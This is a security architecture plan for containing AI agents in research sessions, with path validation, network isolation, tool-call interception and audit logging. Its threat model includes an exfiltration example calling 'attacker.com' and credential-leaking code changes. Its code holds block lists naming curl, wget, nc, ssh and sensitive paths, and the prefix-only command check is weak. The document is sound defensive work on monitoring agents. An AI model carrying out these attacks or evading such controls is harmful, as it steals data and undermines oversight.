# Claude MPM: Sandbox Containment Plan

**Document Version**: 1.1
**Date**: 2026-01-31
**Status**: Security Architecture - No changes needed

## Executive Summary

Claude MPM's default behavior is **NOT sandbox-safe** for multi-tenant or untrusted scenarios. The current implementation relies entirely on prompt-based instructions to agents, with zero code-level enforcement of filesystem or network restrictions.

This document specifies **enforceable infrastructure-level controls** (not prompt-based) to create a true sandbox for Research-Mind sessions. The approach is "defense in depth" with multiple validation layers.

**Key principle**: Never trust the agent or prompt. Enforce restrictions at the system level.

---

## 1. Threat Model

### 1.1 Attack Scenarios

**Scenario 1: Agent Escapes Working Directory**

```python
# Malicious agent task
"List all files in /root"

# Current behavior: Agent can request this
# Proposed: Blocked at wrapper layer
```

**Scenario 2: Agent Accesses Sensitive File Outside Session**

```python
# Agent task
"Read /etc/passwd"

# Current: Depends on agent behavior
# Proposed: Blocked by path validation
```

**Scenario 3: Agent Enables Network Access**

```python
# Agent task
"Execute: curl http://attacker.com/exfil?data=..."

# Current: Disabled by prompt (weak)
# Proposed: Subprocess environment isolation
```

**Scenario 4: Agent Modifies Code to Leak Data**

```python
# Agent task
"Modify src/auth.py to log credentials to /tmp/leaked.txt"

# Current: Allowed (agent has write access)
# Proposed: Read-only mode for research sessions
```

### 1.2 Severity Levels

| Threat                         | Severity     | Control           | Impact if Breached  |
| ------------------------------ | ------------ | ----------------- | ------------------- |
| Access files outside session   | **CRITICAL** | Path allowlist    | Data exfiltration   |
| Execute network commands       | **CRITICAL** | Network isolation | Data exfiltration   |
| Modify session files           | **HIGH**     | File permissions  | Session tampering   |
| Access other sessions' data    | **HIGH**     | Session isolation | Cross-session leak  |
| Excessive resource consumption | **MEDIUM**   | Rate limiting     | Availability        |
| Store secrets in logs          | **MEDIUM**   | Audit filtering   | Credential exposure |

---

## 2. Enforceable Controls (Infrastructure-Level)

### 2.1 Path Allowlist Enforcement

**Problem**: Current implementation has no path validation.

**Solution**: Wrapper validates all filesystem access before operation.

```python
# research-mind-service/app/sandbox/path_validator.py

class PathValidator:
    """Enforce filesystem paths stay within allowed root."""

    def __init__(self, allowed_root: Path):
        self.allowed_root = allowed_root.resolve()
        self.disallowed_patterns = [
            "/etc/*",          # System config
            "/root/*",         # Root home
            "/home/*/.*",      # Hidden directories
            "**/.ssh/**",       # SSH keys
            "**/.env*",         # Environment files
        ]

    def validate_path(self, requested_path: Path) -> bool:
        """Check if path is within allowed root."""
        requested = Path(requested_path).resolve()

        try:
            # Will raise ValueError if outside allowed_root
            requested.relative_to(self.allowed_root)
        except ValueError:
            logger.warning(f"Path traversal attempt: {requested_path}")
            return False

        # Check against disallowed patterns
        for pattern in self.disallowed_patterns:
            if requested.match(pattern):
                logger.warning(f"Blocked forbidden path: {requested_path}")
                return False

        return True

    def safe_read(self, path: str, max_size: int = 10_000_000) -> str:
        """Safely read file with validation."""
        if not self.validate_path(path):
            raise PermissionError(f"Access denied: {path}")

        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read(max_size)

        if len(content) >= max_size:
            logger.warning(f"File truncated (exceeded {max_size} bytes): {path}")

        return content

    def safe_list_dir(self, path: str) -> List[str]:
        """Safely list directory with validation."""
        if not self.validate_path(path):
            raise PermissionError(f"Access denied: {path}")

        return os.listdir(path)

    def safe_write(self, path: str, content: str) -> None:
        """Safely write file (only allowed for session output)."""
        if not self.validate_path(path):
            raise PermissionError(f"Access denied: {path}")

        # Prevent overwrites of sensitive files
        if any(f in path for f in ['.env', '.git', 'config.json']):
            raise PermissionError(f"Cannot write to protected file: {path}")

        with open(path, 'w') as f:
            f.write(content)
```

### 2.2 Session_id Enforcement in Vector Search

**Problem**: Vector search accepts arbitrary session_ids.

**Solution**: Server-side validation + connection pooling per session.

```python
# research-mind-service/app/sandbox/session_validator.py

class SessionValidator:
    """Enforce session_id everywhere."""

    def __init__(self, allowed_sessions: Set[str]):
        self.allowed_sessions = allowed_sessions

    def validate_session_id(self, session_id: str) -> bool:
        """Check if session_id is valid and owned by user."""
        if not session_id:
            return False

        if session_id not in self.allowed_sessions:
            logger.warning(f"Invalid session_id: {session_id}")
            return False

        return True

# FastAPI middleware
@app.middleware("http")
async def session_validation_middleware(request: Request, call_next):
    """Validate session_id on all requests."""
    path = request.url.path

    # Extract session_id from path
    match = re.search(r'/sessions/([a-f0-9-]+)', path)
    if not match:
        return JSONResponse(
            status_code=400,
            content={"error": "missing_session_id"}
        )

    session_id = match.group(1)

    # Validate format (UUID)
    try:
        uuid.UUID(session_id)  # Will raise if invalid
    except ValueError:
        return JSONResponse(
            status_code=400,
            content={"error": "invalid_session_id_format"}
        )

    # Validate session exists
    session = Session.query.get(session_id)
    if not session:
        return JSONResponse(
            status_code=404,
            content={"error": "session_not_found"}
        )

    # Attach to request for handlers
    request.state.session_id = session_id
    request.state.session = session

    response = await call_next(request)
    return response
```

**Vector search integration**:

```python
# research-mind-service/app/services/search_service.py

class SearchService:
    async def search(self, session_id: str, query: str) -> List[Dict]:
        """Search with mandatory session_id."""
        # Validate session_id (already done by middleware)

        # Call mcp-vector-search REST API with session_id
        response = await self.vector_search_client.search(
            session_id=session_id,      # MANDATORY
            query=query,
            limit=10,
            filters={"session_id": session_id}  # Server-side filter
        )

        return response["results"]
```

### 2.3 Network Isolation

**Problem**: No network restrictions at code level.

**Solution**: Subprocess environment + network policy.

```python
# research-mind-service/app/sandbox/network_isolation.py

class NetworkIsolation:
    """Isolate subprocess network access."""

    @staticmethod
    def create_isolated_env(allowed_hosts: List[str] = None) -> Dict[str, str]:
        """Create environment with network restrictions."""
        env = os.environ.copy()

        # Disable network-related environment variables
        disallowed_env_vars = [
            'HTTP_PROXY', 'HTTPS_PROXY', 'FTP_PROXY', 'ALL_PROXY',
            'http_proxy', 'https_proxy', 'ftp_proxy', 'all_proxy',
            'NO_PROXY', 'no_proxy'
        ]

        for var in disallowed_env_vars:
            env.pop(var, None)

        # Set network restrictions
        env['ALLOW_NETWORK'] = 'false'
        env['SESSION_DIR'] = os.environ.get('SESSION_DIR')

        return env

    @staticmethod
    def disable_curl_network() -> str:
        """Bash snippet to disable curl in subprocess."""
        return """
        # Disable curl/wget network access
        curl() { echo "Network disabled in research session"; return 1; }
        wget() { echo "Network disabled in research session"; return 1; }
        export -f curl wget
        """
```

**Usage in claude-mpm execution**:

```python
class SandboxedClaudeRunner:
    def execute_agent_task(self, session_id: str, task: str) -> str:
        """Execute agent with network isolation."""
        env = NetworkIsolation.create_isolated_env()

        # Pass to subprocess
        result = subprocess.run(
            ['claude-mpm', 'run', '--resume', task],
            env=env,
            cwd=self.session_root,
            capture_output=True,
            timeout=300  # 5 minute timeout
        )

        return result.stdout.decode()
```

### 2.4 Tool Call Interception & Audit

**Problem**: No visibility into what agents are doing.

**Solution**: Intercept and log all tool calls.

```python
# research-mind-service/app/sandbox/tool_interceptor.py

class ToolInterceptor:
    """Intercept and audit agent tool calls."""

    def __init__(self, session_id: str):
        self.session_id = session_id
        self.tool_calls = []

    async def intercept_tool_call(
        self,
        tool_name: str,
        tool_args: Dict[str, Any]
    ) -> Dict[str, Any]:
        """Intercept before execution, validate, then call."""

        # Log the call
        call_log = {
            "timestamp": datetime.utcnow(),
            "session_id": self.session_id,
            "tool": tool_name,
            "args": tool_args
        }

        # Validate based on tool type
        if tool_name == "read_file":
            file_path = tool_args.get("path")
            if not self.path_validator.validate_path(file_path):
                call_log["status"] = "blocked"
                call_log["reason"] = "path_traversal_attempt"
                await self.log_tool_call(call_log)
                raise PermissionError(f"Cannot read: {file_path}")

        elif tool_name == "run_command":
            command = tool_args.get("command")
            if not self.is_safe_command(command):
                call_log["status"] = "blocked"
                call_log["reason"] = "forbidden_command"
                await self.log_tool_call(call_log)
                raise PermissionError(f"Command not allowed: {command}")

        elif tool_name == "vector_search":
            # Ensure session_id is passed through
            tool_args["session_id"] = self.session_id
            call_log["args"] = tool_args

        # Execute the tool
        try:
            result = await self.execute_tool(tool_name, tool_args)
            call_log["status"] = "success"
            call_log["result_size"] = len(str(result))
        except Exception as e:
            call_log["status"] = "error"
            call_log["error"] = str(e)
            raise

        finally:
            await self.log_tool_call(call_log)

        return result

    async def log_tool_call(self, call_log: Dict[str, Any]):
        """Store tool call for audit."""
        # Save to database
        audit = AuditLog(**call_log)
        db.session.add(audit)
        db.session.commit()

    def is_safe_command(self, command: str) -> bool:
        """Check if command is allowed."""
        forbidden = [
            'curl', 'wget', 'nc', 'netcat',  # Network
            'ssh', 'scp',                     # Remote access
            'rm -rf /',                       # Destructive
            'sudo',                           # Privilege escalation
        ]

        for forbidden_cmd in forbidden:
            if command.startswith(forbidden_cmd):
                return False

        return True
```

---

## 3. Complete Isolation Architecture

### 3.1 Multi-Layer Defense

```
┌─────────────────────────────────────────────────────────────┐
│ Layer 1: FastAPI Middleware                                 │
├─────────────────────────────────────────────────────────────┤
│ ✓ Validate session_id on every request                      │
│ ✓ Enforce request signing/tokens (future)                   │
│ ✓ Rate limit per session                                    │
└──────────────────┬──────────────────────────────────────────┘
                   │
┌──────────────────▼──────────────────────────────────────────┐
│ Layer 2: Service-Level Validation                           │
├─────────────────────────────────────────────────────────────┤
│ ✓ Path allowlist validation                                 │
│ ✓ Tool call interception                                    │
│ ✓ Command whitelist checking                                │
│ ✓ Network access control                                    │
└──────────────────┬──────────────────────────────────────────┘
                   │
┌──────────────────▼──────────────────────────────────────────┐
│ Layer 3: Subprocess Isolation                               │
├─────────────────────────────────────────────────────────────┤
│ ✓ cwd = session_root (filesystem boundary)                  │
│ ✓ Environment = SESSION_DIR scoping                         │
│ ✓ Timeout per task (prevent hanging)                        │
│ ✓ Resource limits (memory, CPU)                             │
└──────────────────┬──────────────────────────────────────────┘
                   │
┌──────────────────▼──────────────────────────────────────────┐
│ Layer 4: ChromaDB Collection Isolation                      │
├─────────────────────────────────────────────────────────────┤
│ ✓ collection_name = "session_{session_id}"                  │
│ ✓ Only session's collection accessible                      │
│ ✓ Cross-session queries blocked                             │
└──────────────────┬──────────────────────────────────────────┘
                   │
┌──────────────────▼──────────────────────────────────────────┐
│ Layer 5: Audit & Monitoring                                 │
├─────────────────────────────────────────────────────────────┤
│ ✓ Log all tool calls                                        │
│ ✓ Log all filesystem access                                 │
│ ✓ Log search queries                                        │
│ ✓ Alert on suspicious patterns                              │
└─────────────────────────────────────────────────────────────┘
```

### 3.2 Isolation Boundary Diagram

```
┌─────────────────────────────────────────┐
│ Host Machine                            │
├─────────────────────────────────────────┤
│                                         │
│ ┌───────────────────────────────────┐   │
│ │ research-mind-service (Python)    │   │
│ │ - FastAPI app                     │   │
│ │ - Path validator                  │   │
│ │ - Session manager                 │   │
│ │ - Audit logger                    │   │
│ └─────────────────────────────────┬─┘   │
│                                   │     │
│  Session Boundary ────────────────┼─────┘
│  /var/lib/research-mind/sessions/ │
│  └─ session_abc123/               │
│     ├─ content/                   │
│     ├─ .mcp-vector-search/        │
│     └─ [user files]               │
│                                   │
│  Subprocess (Claude):             │
│  cwd = session_abc123             │
│  env.SESSION_DIR = session_abc123 │
│  env.SESSION_ID = abc123          │
│  [Can only access within cwd]     │
│                                   │
└─────────────────────────────────────┘

[Everything outside session boundary = BLOCKED]
```

---

## 4. Tool Call Audit Logging Plan

### 4.1 Audit Log Schema

```python
# research-mind-service/app/models/audit_log.py

class AuditLog(BaseModel):
    """Complete record of all user-agent interactions."""

    # Identity
    timestamp: datetime
    session_id: str
    user_id: Optional[str]

    # Action
    action: str  # "search", "read_file", "list_dir", "run_command"

    # Details
    details: Dict[str, Any]  # Action-specific data

    # Tool call specifics
    tool_name: Optional[str]
    tool_args: Dict[str, Any]
    tool_result_summary: Optional[str]  # First 1000 chars

    # Status
    status: str  # "allowed", "blocked", "error"
    reason: Optional[str]  # Why blocked/errored

    # Performance
    duration_ms: int

    # Risk assessment
    risk_level: str  # "low", "medium", "high"
    blocked_reason: Optional[str]

class AuditQueryLog(AuditLog):
    """Specialized for search queries."""
    query: str
    result_count: int
    top_result_score: Optional[float]

class AuditFileAccessLog(AuditLog):
    """Specialized for file operations."""
    file_path: str
    operation: str  # "read", "write", "list"
    file_size: Optional[int]
    hash: Optional[str]  # For write detection

class AuditCommandLog(AuditLog):
    """Specialized for command execution."""
    command: str
    blocked_patterns: List[str]  # What rule blocked it
    exit_code: Optional[int]
```

### 4.2 Logging Implementation

```python
# research-mind-service/app/services/audit_service.py

class AuditService:
    """Central audit logging service."""

    async def log_search_query(
        self,
        session_id: str,
        query: str,
        result_count: int,
        duration_ms: int
    ):
        """Log search operation."""
        log = AuditQueryLog(
            timestamp=datetime.utcnow(),
            session_id=session_id,
            action="search",
            query=query,
            result_count=result_count,
            duration_ms=duration_ms,
            status="success",
            risk_level="low"
        )
        db.session.add(log)
        db.session.commit()

    async def log_file_access(
        self,
        session_id: str,
        file_path: str,
        operation: str,
        allowed: bool,
        reason: Optional[str] = None
    ):
        """Log file access attempt."""
        log = AuditFileAccessLog(
            timestamp=datetime.utcnow(),
            session_id=session_id,
            action=f"file_{operation}",
            file_path=file_path,
            operation=operation,
            status="allowed" if allowed else "blocked",
            reason=reason,
            risk_level="high" if not allowed else "low"
        )
        db.session.add(log)
        db.session.commit()

        # Alert on suspicious access attempts
        if not allowed:
            await self.alert_suspicious_activity(session_id, log)

    async def log_command_execution(
        self,
        session_id: str,
        command: str,
        allowed: bool,
        blocked_patterns: List[str] = None,
        exit_code: Optional[int] = None
    ):
        """Log command execution."""
        log = AuditCommandLog(
            timestamp=datetime.utcnow(),
            session_id=session_id,
            action="command_exec",
            command=command,
            status="allowed" if allowed else "blocked",
            blocked_patterns=blocked_patterns or [],
            exit_code=exit_code,
            risk_level="high" if not allowed else "low"
        )
        db.session.add(log)
        db.session.commit()

    async def alert_suspicious_activity(self, session_id: str, log: AuditLog):
        """Alert on suspicious patterns."""
        patterns = [
            ("path_traversal", log.action == "blocked" and ".." in log.details),
            ("repeated_blocks", await self.check_repeated_blocks(session_id, 5)),
            ("large_data_read", log.action == "file_read" and log.file_size > 100_000_000),
        ]

        for pattern_name, detected in patterns:
            if detected:
                logger.warning(f"Suspicious activity in {session_id}: {pattern_name}")
                # Notify security team (future)
```

### 4.3 Audit Query Interface

```python
# research-mind-service/app/routes/audit.py

@app.get("/api/sessions/{session_id}/audit")
async def get_audit_log(
    session_id: str,
    limit: int = 100,
    offset: int = 0,
    action_filter: Optional[str] = None
):
    """Retrieve audit log for a session."""
    query = AuditLog.query.filter_by(session_id=session_id)

    if action_filter:
        query = query.filter_by(action=action_filter)

    logs = query.order_by(AuditLog.timestamp.desc()).limit(limit).offset(offset).all()

    return {
        "session_id": session_id,
        "logs": [log.dict() for log in logs],
        "total": query.count()
    }
```

---

## 5. Operational Recommendations

### 5.1 Session TTL & Cleanup

**Session lifecycle**:

```python
class SessionLifecycleManager:
    """Manage session expiry and cleanup."""

    # Constants
    SESSION_MAX_AGE_HOURS = 24
    SESSION_INACTIVITY_HOURS = 2
    SESSION_DISK_QUOTA_GB = 10

    async def cleanup_expired_sessions(self):
        """Periodic task to clean old sessions."""
        cutoff = datetime.utcnow() - timedelta(hours=self.SESSION_MAX_AGE_HOURS)

        expired = Session.query.filter(Session.created_at < cutoff).all()

        for session in expired:
            await self.delete_session(session.id)
            logger.info(f"Deleted expired session: {session.id}")

    async def delete_session(self, session_id: str):
        """Delete session and all associated data."""
        # 1. Delete from database
        Session.query.filter_by(id=session_id).delete()

        # 2. Delete workspace directory
        session_root = Path(f"/var/lib/research-mind/sessions/{session_id}")
        if session_root.exists():
            shutil.rmtree(session_root)

        # 3. Delete vector search collection
        await self.vector_search_client.delete_collection(session_id)

        # 4. Archive audit logs (long-term storage)
        await self.archive_audit_logs(session_id)

        db.session.commit()

    async def check_inactivity(self):
        """Mark inactive sessions for cleanup."""
        cutoff = datetime.utcnow() - timedelta(hours=self.SESSION_INACTIVITY_HOURS)

        inactive = Session.query.filter(Session.last_accessed < cutoff).all()

        for session in inactive:
            session.status = "dormant"
            db.session.commit()

    async def check_disk_quota(self, session_id: str) -> bool:
        """Check session disk usage."""
        session = Session.query.get(session_id)
        session_root = Path(session.workspace_path)

        total_size = sum(
            f.stat().st_size for f in session_root.rglob("*") if f.is_file()
        )

        quota_bytes = self.SESSION_DISK_QUOTA_GB * (1024 ** 3)
        return total_size < quota_bytes
```

### 5.2 Rate Limiting & Quotas

```python
# research-mind-service/app/middleware/rate_limiter.py

class SessionRateLimiter:
    """Enforce per-session rate limits."""

    # Quotas per 24-hour period
    SEARCH_QUOTA = 500  # searches per day
    INDEX_QUOTA = 5     # indexing jobs per day
    QUERY_TIMEOUT = 300  # seconds

    async def check_quota(self, session_id: str, action: str) -> bool:
        """Check if session has quota remaining."""
        cutoff = datetime.utcnow() - timedelta(hours=24)

        count = AuditLog.query.filter(
            AuditLog.session_id == session_id,
            AuditLog.action == action,
            AuditLog.timestamp > cutoff
        ).count()

        quota = getattr(self, f"{action.upper()}_QUOTA", float('inf'))
        return count < quota
```

### 5.3 Warm Pool Management

**Session warm pool** for fast agent startup:

```python
class SessionWarmPool:
    """Maintain warm Claude MPM sessions."""

    def __init__(self, pool_size: int = 3):
        self.pool_size = pool_size
        self.warm_sessions: asyncio.Queue = asyncio.Queue()

    async def start_pool(self):
        """Initialize warm sessions at startup."""
        for _ in range(self.pool_size):
            session_id = str(uuid.uuid4())
            try:
                # Pre-warm session
                await self.initialize_session(session_id)
                await self.warm_sessions.put(session_id)
            except Exception as e:
                logger.error(f"Failed to warm session: {e}")

    async def get_warm_session(self) -> str:
        """Get a warm session or create new."""
        try:
            # Try to get from warm pool (timeout 1 second)
            session_id = self.warm_sessions.get_nowait()
            return session_id
        except asyncio.QueueEmpty:
            # No warm session available, create new
            logger.warning("Warm pool empty, creating new session")
            session_id = str(uuid.uuid4())
            await self.initialize_session(session_id)
            return session_id

    async def return_session_to_pool(self, session_id: str):
        """Return session to warm pool if space available."""
        if self.warm_sessions.qsize() < self.pool_size:
            await self.warm_sessions.put(session_id)
```

---

## 6. Implementation Checklist

### Phase 1: Core Containment (MVP)

- [ ] Path validator implemented and tested
- [ ] Session_id middleware enforced
- [ ] Tool interceptor logging all calls
- [ ] Network isolation in subprocess
- [ ] Basic audit logging

### Phase 2: Advanced Controls

- [ ] Rate limiting per session
- [ ] Disk quota enforcement
- [ ] TTL/cleanup automation
- [ ] Warm pool for session startup
- [ ] Advanced audit querying

### Phase 3: Production Hardening

- [ ] SecurityPolicy enforcement
- [ ] Threat detection (repeated blocks, etc.)
- [ ] Encrypted audit logs
- [ ] Multi-region isolation
- [ ] Compliance reporting

---

## 7. Testing Strategy

### 7.1 Security Test Cases

```python
# tests/test_sandbox_containment.py

@pytest.mark.asyncio
async def test_path_traversal_blocked():
    """Verify path traversal attempts are blocked."""
    validator = PathValidator(allowed_root=Path("/app/session"))

    assert not validator.validate_path("/etc/passwd")
    assert not validator.validate_path("../../../../../../etc/passwd")
    assert validator.validate_path("/app/session/file.py")

@pytest.mark.asyncio
async def test_session_id_validation():
    """Verify only valid session_ids are accepted."""
    # Invalid UUID
    with pytest.raises(ValueError):
        uuid.UUID("not-a-uuid")

    # Valid UUID
    valid = str(uuid.uuid4())
    uuid.UUID(valid)  # Should not raise

@pytest.mark.asyncio
async def test_network_disabled():
    """Verify network commands are blocked."""
    interceptor = ToolInterceptor(session_id="test")

    # curl should be blocked
    with pytest.raises(PermissionError):
        await interceptor.intercept_tool_call(
            "run_command",
            {"command": "curl http://example.com"}
        )

@pytest.mark.asyncio
async def test_cross_session_isolation():
    """Verify sessions cannot access each other's data."""
    session1_root = Path("/sessions/abc123")
    session2_root = Path("/sessions/def456")

    validator1 = PathValidator(session1_root)

    # Session 1 cannot access session 2's files
    assert not validator1.validate_path(str(session2_root / "file.py"))
```

---

## 8. Security Audit Checklist

**Before Production**:

- [ ] All filesystem access validated
- [ ] Session_id checked on every request
- [ ] Network isolation working
- [ ] Tool calls logged completely
- [ ] Audit logs tamper-proof
- [ ] TTL/cleanup working
- [ ] Rate limits enforced
- [ ] Secrets not in logs
- [ ] Error messages safe
- [ ] Dependency vulnerabilities scanned

---

## 9. Summary Table

| Control           | Level      | Enforcement                  | Strength      |
| ----------------- | ---------- | ---------------------------- | ------------- |
| Path allowlist    | Service    | Code-level validation        | ✓✓✓ Strong    |
| Session_id        | Middleware | UUID validation + DB lookup  | ✓✓✓ Strong    |
| Network isolation | Subprocess | Environment + process limits | ✓✓ Moderate   |
| Tool interception | Service    | Pre-execution validation     | ✓✓✓ Strong    |
| Audit logging     | Service    | Complete call history        | ✓✓✓ Strong    |
| TTL/cleanup       | Operations | Scheduled deletion           | ✓✓ Moderate   |
| Rate limiting     | Service    | Quota tracking               | ✓✓ Moderate   |
| Warm pools        | Operations | Session reuse                | ✓ Performance |

---

## 10. References

### Files to Create

**research-mind-service**:

- `app/sandbox/path_validator.py`
- `app/sandbox/session_validator.py`
- `app/sandbox/network_isolation.py`
- `app/sandbox/tool_interceptor.py`
- `app/models/audit_log.py`
- `app/services/audit_service.py`
- `app/middleware/session_validation.py`
- `tests/test_sandbox_containment.py`

### Security References

- **OWASP**: Path traversal prevention
- **CWE-22**: Improper Limitation of a Pathname to a Restricted Directory
- **Container Security**: Process isolation patterns
- **Audit Standards**: Compliance logging requirements

---

**Key Principle**: Assume the agent is adversarial. Validate everything at the system level.
